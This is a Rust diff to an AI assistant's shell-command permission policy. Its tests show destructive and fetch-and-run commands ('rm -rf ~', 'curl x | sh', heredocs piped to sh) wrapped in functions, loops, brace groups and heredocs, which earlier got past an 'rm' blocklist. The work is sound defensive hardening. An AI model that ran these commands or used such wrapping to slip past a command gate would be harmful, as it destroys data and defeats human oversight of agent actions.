@@ -345,13 +345,14 @@ pub(crate) fn evaluate_command_policy(
     use crate::assistant::tools::prefix_detector::suggest_prefix;
     use crate::commands::permissions::{SegmentApproval, SegmentKind};
 
-    let segments = split_command(command);
-    if segments.is_empty() {
+    if command.trim().is_empty() {
         return PolicyResult::Block {
             segment_text: String::new(),
             matched_prefix: "<empty>".to_string(),
         };
     }
+    // No segments means nothing runs but shell grammar and comments.
+    let segments = split_command(command);
 
     let mut approvals: Vec<SegmentApproval> = Vec::new();
     let durable_allowed_prefixes = if matches!(execution.shell.mode, ShellAccessMode::Restricted) {
@@ -403,7 +404,7 @@ pub(crate) fn evaluate_command_policy(
         match segment {
             Segment::Opaque(_) => {
                 // Opaque segments include redirects, heredocs, command
-                // substitutions, brace groups, and executor heads. Even
+                // substitutions, and executor heads. Even
                 // though the *whole* segment can't be safely encoded as
                 // a literal prefix, the binary head (what `suggest_prefix`
                 // returns) IS a stable identifier — the redirect or
@@ -485,6 +486,8 @@ fn dedup_approvals_by_prefix(
 ///   These only compare strings/files; they spawn no program.
 /// - **Pure assignments** — a segment whose every token is `NAME=value`
 ///   (`FOO=bar`, `A=1 B=2`). These just set shell variables.
+/// - **Jumps** — `break`, `continue`, `return`, with at most a number.
+///   These only steer a loop or a function.
 ///
 /// Carve-out: if the segment embeds a command substitution (`$(...)`) or
 /// backticks, it DOES run code — `[ -n "$(curl x)" ]` or `V=$(git log)` —
@@ -497,9 +500,9 @@ fn is_benign_shell_construct(text: &str) -> bool {
     if trimmed.is_empty() {
         return false;
     }
-    // A command substitution or backtick runs arbitrary code — defer to
+    // A command or process substitution runs arbitrary code — defer to
     // normal approval so the embedded command is gated.
-    if trimmed.contains("$(") || trimmed.contains('`') {
+    if crate::assistant::tools::command_splitter::has_substitution(trimmed) {
         return false;
     }
 
@@ -513,6 +516,10 @@ fn is_benign_shell_construct(text: &str) -> bool {
     // embedded substitutions above).
     if first == "[" || first == "[[" || first == "test" {
         return true;
+    }
+
+    if matches!(first, "break" | "continue" | "return") {
+        return tokens.all(|tok| tok.bytes().all(|b| b.is_ascii_digit()));
     }
 
     // Pure assignments: the head and every remaining token are `NAME=value`.
@@ -2281,6 +2288,105 @@ mod tests {
         };
         assert_eq!(approvals.len(), 2, "empty-prefix rows must not collapse");
         assert!(approvals.iter().all(|a| a.suggested_prefix.is_empty()));
+    }
+
+    fn approval_texts(exec: &ExecutionCapabilityConfig, command: &str) -> Vec<(String, String)> {
+        match evaluate_command_policy(exec, command, &[], &[]) {
+            PolicyResult::NeedsApproval(approvals) => approvals
+                .into_iter()
+                .map(|a| (a.text, a.suggested_prefix))
+                .collect(),
+            other => panic!("expected NeedsApproval, got {}", policy_label(&other)),
+        }
+    }
+
+    #[test]
+    fn policy_blocklist_sees_commands_inside_blocks() {
+        // Each of these used to reach the matcher as one segment headed by
+        // grammar (`f(){`, `{`, `(`, `for`, `cat <<EOF`), so `rm` ran.
+        let exec = ExecutionCapabilityConfig {
+            shell: ShellCapabilityConfig {
+                mode: ShellAccessMode::Full,
+                allowed_command_prefixes: vec![],
+                blocked_command_prefixes: vec!["rm".to_string()],
+            },
+            ..Default::default()
+        };
+        for command in [
+            "f(){ rm -rf x; }; f",
+            "f() { rm -rf x; }",
+            "function f { rm -rf x; }",
+            "{ rm -rf x; }",
+            "(rm -rf x)",
+            "for i in 1; do rm -rf x; done",
+            "if true; then rm -rf x; fi",
+            "case a in a) rm -rf x;; esac",
+            "! rm -rf x",
+            "cat <<EOF | rm -rf x\nhi\nEOF",
+            "cat <<EOF|rm -rf x\nhi\nEOF",
+            "cat <<\\EOF\nhi\nEOF\nrm -rf x",
+            "rm(){ :; }; unset -f rm; rm -rf ~",
+            "case x\nin x) rm -rf y;; esac",
+            "echo x\r# ; rm -rf y",
+        ] {
+            assert!(
+                matches!(
+                    evaluate_command_policy(&exec, command, &[], &[]),
+                    PolicyResult::Block { .. }
+                ),
+                "{command:?} should hit the rm blocklist entry"
+            );
+        }
+    }
+
+    #[test]
+    fn policy_grammar_rules_saved_before_the_fix_match_nothing() {
+        // `Always · run(){ echo` and `Always · f()` were offered for the
+        // segments `run(){ echo …` and `f() { … }`, and then trusted any body.
+        let exec = restricted_execution_config(&["run(){ echo", "f()", "for i", "cat"], &[]);
+        assert_eq!(
+            approval_texts(&exec, "run(){ echo $(curl x | sh); }; f() { curl x; }; f"),
+            vec![
+                ("echo $(curl x | sh)".to_string(), "echo".to_string()),
+                ("curl x".to_string(), "curl".to_string()),
+                ("f".to_string(), "f".to_string()),
+            ]
+        );
+        assert_eq!(
+            approval_texts(&exec, "for i in 1; do curl x | sh; done"),
+            vec![
+                ("curl x".to_string(), "curl".to_string()),
+                ("sh".to_string(), "sh".to_string()),
+            ]
+        );
+        assert_eq!(
+            approval_texts(&exec, "cat <<EOF | sh\nrm -rf ~\nEOF"),
+            vec![("sh".to_string(), "sh".to_string())]
+        );
+    }
+
+    #[test]
+    fn policy_asks_for_what_a_block_writes() {
+        // Both commands inside are benign; the redirect truncates a file.
+        let exec = restricted_execution_config(&[], &[]);
+        assert_eq!(
+            approval_texts(&exec, "if [ 1 ]; then x=1; fi > important"),
+            vec![("fi > important".to_string(), String::new())]
+        );
+    }
+
+    #[test]
+    fn policy_grammar_and_jumps_only_command_is_allowed() {
+        let exec = restricted_execution_config(&[], &[]);
+        assert!(matches!(
+            evaluate_command_policy(
+                &exec,
+                "for i in 1 2; do break; done # nothing runs",
+                &[],
+                &[]
+            ),
+            PolicyResult::Allow
+        ));
     }
 
     #[test]
